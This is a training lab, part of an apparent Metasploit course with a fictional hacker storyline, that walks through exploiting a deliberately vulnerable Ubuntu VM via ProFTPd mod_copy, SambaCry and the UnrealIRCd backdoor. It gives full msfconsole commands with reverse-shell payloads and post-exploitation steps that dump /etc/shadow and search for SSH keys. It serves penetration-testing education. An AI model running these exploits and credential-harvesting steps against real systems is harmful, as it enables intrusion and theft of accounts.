# MSF-101-L — Bronze Level: Linux
## Operation: Lazarus Protocol — Chapter 1-B
### *"The Back Door"*

---

> *Zara "0x1A" Chen pulled up the second target on her laptop — the Ubuntu 14.04 box,*
> *nicknamed "Lazarus-Lin" in the team's notes. She cracked her knuckles.*
> *"Linux admins always think they're immune because they're not running Windows.*
> *They forget that their FTP daemon is running a module from 2012."*
>
> *She opened msfconsole. The cursor blinked.*

---

## Objectives

By the end of this lab you will be able to:

1. Use MSF auxiliary modules to enumerate Linux services
2. Exploit **ProFTPd mod_copy** (CVE-2015-3306) for unauthenticated file copy
3. Exploit **Samba** (CVE-2017-7494 — SambaCry) for remote code execution
4. Obtain a shell on a Linux target and perform basic post-exploitation
5. Understand the difference between a Meterpreter session and a raw shell session
6. Recognize how default/weak service configurations create attack surface

---

## Target

| Property         | Value                        |
|------------------|------------------------------|
| OS               | Ubuntu 14.04.4 LTS           |
| IP               | `192.168.56.102` (verify!)   |
| Attacker IP      | `192.168.56.1`               |
| Default creds    | vagrant / vagrant            |

---

## Background: The Vulnerability Landscape

### ProFTPd mod_copy — CVE-2015-3306

ProFTPd is a widely used FTP server on Linux systems. Its `mod_copy` module allows
authenticated users to copy files on the server using `CPFR` and `CPTO` commands.
However, in versions before 1.3.5a, **unauthenticated** users could issue these commands.

This means an attacker can copy any file readable by the FTP process to a web-accessible
directory, then retrieve it — or copy a shell script to a location where it gets executed.

### Samba — CVE-2017-7494 (SambaCry)

Released in May 2017 (the same month as WannaCry), SambaCry is a remote code execution
vulnerability in Samba versions 3.5.0 to 4.6.4. It allows an attacker to upload a shared
library to a writable share and cause Samba to load and execute it. No authentication
required on misconfigured systems.

The Linux equivalent of EternalBlue — both exploited the same protocol (SMB/CIFS) in
the same month. Ghost Circuit used both.

---

## Phase 0 — Setup

```bash
# Start MSF database and console
sudo service postgresql start
msfconsole -q

# Create a workspace for this lab
msf6 > workspace -a msf101-linux
msf6 > workspace
# * msf101-linux
```

---

## Phase 1 — Reconnaissance

### 1.1 — Host Discovery and Service Scan

```bash
# Add the target to the database
msf6 > db_nmap -sn 192.168.56.0/24

# Full service scan
msf6 > db_nmap -sV -sC -p- --open 192.168.56.102

# Review what we found
msf6 > services
```

### 1.2 — FTP Enumeration

```bash
# Check ProFTPd version and anonymous access
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(ftp_version) > set RHOSTS 192.168.56.102
msf6 auxiliary(ftp_version) > run
```

Expected output: `ProFTPD 1.3.5` — this is vulnerable.

```bash
# Test anonymous FTP login
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(anonymous) > set RHOSTS 192.168.56.102
msf6 auxiliary(anonymous) > run
```

### 1.3 — SMB / Samba Enumeration

```bash
# Enumerate Samba shares
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(smb_enumshares) > set RHOSTS 192.168.56.102
msf6 auxiliary(smb_enumshares) > set SMBUser ""
msf6 auxiliary(smb_enumshares) > set SMBPass ""
msf6 auxiliary(smb_enumshares) > run

# Get Samba version
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > set RHOSTS 192.168.56.102
msf6 auxiliary(smb_version) > run
```

Make note of:
- Share names (especially any writable shares)
- Samba version — needed to confirm CVE-2017-7494 applicability

### 1.4 — IRC Service Check

```bash
# Scan the IRC port
msf6 > db_nmap -sV -p 6667 192.168.56.102
```

```bash
# Check for UnrealIRCd backdoor
msf6 > use auxiliary/scanner/irc/irc_version
msf6 auxiliary(irc_version) > set RHOSTS 192.168.56.102
msf6 auxiliary(irc_version) > set RPORT 6667
msf6 auxiliary(irc_version) > run
```

> **Context:** UnrealIRCd 3.2.8.1 was distributed with a backdoor inserted by an
> attacker who compromised the distribution server in 2009. Anyone connecting to
> port 6667 and sending a specific string gets a shell. This is a real historical
> incident and a key lesson in **supply chain security**.

### 1.5 — MySQL Enumeration

```bash
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(mysql_version) > set RHOSTS 192.168.56.102
msf6 auxiliary(mysql_version) > run

# Check for empty root password (default MySQL misconfiguration)
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(mysql_login) > set RHOSTS 192.168.56.102
msf6 auxiliary(mysql_login) > set USERNAME root
msf6 auxiliary(mysql_login) > set PASSWORD ""
msf6 auxiliary(mysql_login) > set BLANK_PASSWORDS true
msf6 auxiliary(mysql_login) > run
```

---

## Phase 2 — Exploitation

### Attack Vector 1: ProFTPd mod_copy (CVE-2015-3306)

The exploit workflow:
1. Use mod_copy's `SITE CPFR/CPTO` commands to copy a file via FTP
2. Copy a PHP web shell to the web server's document root
3. Access the shell via HTTP

```bash
msf6 > search proftpd
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(proftpd_modcopy_exec) > info
```

```bash
# Configure the exploit
msf6 exploit(proftpd_modcopy_exec) > set RHOSTS 192.168.56.102
msf6 exploit(proftpd_modcopy_exec) > set SITEPATH /var/www/html
msf6 exploit(proftpd_modcopy_exec) > set TARGETURI /
msf6 exploit(proftpd_modcopy_exec) > set LHOST 192.168.56.1
msf6 exploit(proftpd_modcopy_exec) > set PAYLOAD cmd/unix/reverse_netcat

# Fire
msf6 exploit(proftpd_modcopy_exec) > run
```

**What just happened:**
- MSF used FTP mod_copy to copy a PHP shell file to `/var/www/html/`
- MSF then made an HTTP request to trigger the PHP shell
- The shell connected back to your listener

```bash
# You should now have a shell session
msf6 > sessions

# Interact with it
msf6 > sessions -i 1
```

This is a raw command shell (not Meterpreter). Notice the difference — no `sysinfo`,
no `download`, no `migrate`. Just `cmd/unix/reverse_netcat`.

```bash
# Basic recon in the shell
id
whoami
hostname
uname -a
cat /etc/os-release
cat /etc/passwd
```

Background this session:
```bash
# Press Ctrl+Z or type:
background
```

### Attack Vector 2: SambaCry (CVE-2017-7494)

This exploit uploads a malicious shared library to a writable Samba share,
then triggers Samba to load and execute it.

```bash
msf6 > search samba type:exploit
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(is_known_pipename) > info
```

```bash
# Configure
msf6 exploit(is_known_pipename) > set RHOSTS 192.168.56.102
msf6 exploit(is_known_pipename) > set LHOST 192.168.56.1

# Check available payloads
msf6 exploit(is_known_pipename) > show payloads

# Use a Meterpreter payload for more capability
msf6 exploit(is_known_pipename) > set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Check — this module supports it
msf6 exploit(is_known_pipename) > check

# Run
msf6 exploit(is_known_pipename) > run
```

**Expected output:**
```
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] 192.168.56.102:445 - Using location \\192.168.56.102\tmp\ for the path
[*] 192.168.56.102:445 - Retrieving the remote path of the share 'tmp'
[*] 192.168.56.102:445 - Share 'tmp' has server-side path '/tmp'
[*] 192.168.56.102:445 - Uploaded payload to \\192.168.56.102\tmp\XsFiRBPN.so
[*] 192.168.56.102:445 - Loading the payload from server-side path...
[+] 192.168.56.102:445 - Probe response indicates the target executed the payload!
[*] Sending stage (1017164 bytes) to 192.168.56.102
[*] Meterpreter session 2 opened
```

### Attack Vector 3: UnrealIRCd Backdoor

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_perl
msf6 exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1
msf6 exploit(unreal_ircd_3281_backdoor) > run
```

This one is almost too easy — the backdoor is triggered by sending a single command
over IRC. You get a shell as the user running the IRC daemon.

> **Discussion:** The UnrealIRCd backdoor was in the wild for 8 months before being
> discovered. Server admins trust that software downloaded from official sources is clean.
> This assumption is the foundation of **supply chain attacks** — a major APT vector.
> SolarWinds (2020) is the most famous modern example.

---

## Phase 3 — Post-Exploitation on Linux

Now working with your SambaCry Meterpreter session:

```bash
msf6 > sessions -i 2

# System information
meterpreter > sysinfo
meterpreter > getuid

# Check if we're in a container/VM
meterpreter > run post/linux/gather/checkvm

# Enumerate users
meterpreter > shell
$ cat /etc/passwd | grep -v nologin | grep -v false
$ cat /etc/shadow   # Will work if we have root; shows password hashes
$ exit

# Enumerate running services
meterpreter > shell
$ ps aux
$ netstat -tulnp
$ exit
```

### 3.1 — File System Loot

```bash
# Look for sensitive files
meterpreter > shell
$ find / -name "*.conf" -readable 2>/dev/null | grep -E "(mysql|ftp|ssh|password)" | head -20
$ find /home -name "*.ssh" -o -name "id_rsa" 2>/dev/null
$ cat /var/log/auth.log | head -50    # Login attempts
$ exit

# Download interesting files
meterpreter > download /etc/passwd /tmp/lin_passwd.txt
meterpreter > download /etc/shadow /tmp/lin_shadow.txt
```

### 3.2 — Check SUID Binaries (Privilege Escalation Clue)

```bash
meterpreter > shell
$ find / -perm -4000 -type f 2>/dev/null
```

SUID binaries run with the file owner's permissions (often root) regardless of who
executes them. A misconfigured SUID binary is a classic Linux privilege escalation path.
Note any unusual ones — these are gold for the Silver level.

### 3.3 — Capture the Flag!

```bash
# Nexus Dynamics' replica puts a "flag" file in the root's home
meterpreter > shell
$ cat /root/flag.txt     # Might need root — try anyway
$ exit
```

---

## Phase 4 — Upgrade a Shell Session to Meterpreter

You have raw shell sessions from ProFTPd and UnrealIRCd exploits.
MSF can upgrade them to Meterpreter without re-exploiting:

```bash
# List sessions
msf6 > sessions

# Upgrade session 1 (raw shell) to Meterpreter
msf6 > sessions -u 1

# Alternatively, use the post module
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION 1
msf6 post(shell_to_meterpreter) > set LHOST 192.168.56.1
msf6 post(shell_to_meterpreter) > run
```

---

## Deliverables

Complete and document the following in a **lab report** (Markdown format):

- [ ] **D1:** Full `services` output from the MSF database showing all Linux target services
- [ ] **D2:** Screenshot showing ProFTPd version identification (auxiliary scanner)
- [ ] **D3:** Screenshot of successful ProFTPd mod_copy shell session (`id` output)
- [ ] **D4:** Screenshot of successful SambaCry Meterpreter session (`sysinfo` output)
- [ ] **D5:** Contents of `/etc/passwd` collected from the target
- [ ] **D6:** Output of the SUID binary search
- [ ] **D7:** Answer the following discussion questions:

**Discussion Questions:**

1. ProFTPd mod_copy was patched in version 1.3.5a. The Metasploitable 3 Ubuntu target
   runs 1.3.5 (unpatched). What **compensating control** could a sysadmin implement
   to reduce risk *without* patching? Think about network-level and service-level options.

2. Both SambaCry (Linux) and EternalBlue (Windows) hit in May 2017 and both target SMB.
   Why do you think SMB has been such a historically vulnerable protocol? What makes
   it an attractive target for APTs?

3. You now have **three separate sessions** on the Linux target from three different
   exploits. As a defender, which of the three attack vectors would be the **hardest
   to detect** in network traffic? Justify your answer.

---

## Cleanup

```bash
# Kill all sessions
msf6 > sessions -K

# Revert VM snapshot
VBoxManage snapshot "metasploitable3-ub1404" restore "clean-state"
```

---

## What's Next?

You've breached both Windows and Linux targets using well-known, documented vulnerabilities.
The barrier to entry is low. Ghost Circuit knew this. Real-world APTs start here and
work inward from these footholds.

Move to **MSF-201-W (Silver)** to learn what happens after the first shell:
privilege escalation, credential harvesting, persistence, and the beginning of
lateral movement.

*"In 2017, the same two protocols fell worldwide on the same day. SMB doesn't forgive."*
— Zara "0x1A" Chen

---

## Reference

| Module | Purpose |
|--------|---------|
| `auxiliary/scanner/ftp/ftp_version` | Identify FTP daemon version |
| `auxiliary/scanner/ftp/anonymous` | Test anonymous FTP login |
| `auxiliary/scanner/smb/smb_enumshares` | List SMB shares |
| `auxiliary/scanner/mysql/mysql_login` | MySQL credential testing |
| `exploit/unix/ftp/proftpd_modcopy_exec` | ProFTPd mod_copy RCE |
| `exploit/linux/samba/is_known_pipename` | SambaCry (CVE-2017-7494) |
| `exploit/unix/irc/unreal_ircd_3281_backdoor` | UnrealIRCd backdoor |
| `post/multi/manage/shell_to_meterpreter` | Upgrade shell to Meterpreter |
| `post/linux/gather/checkvm` | Detect virtualization |
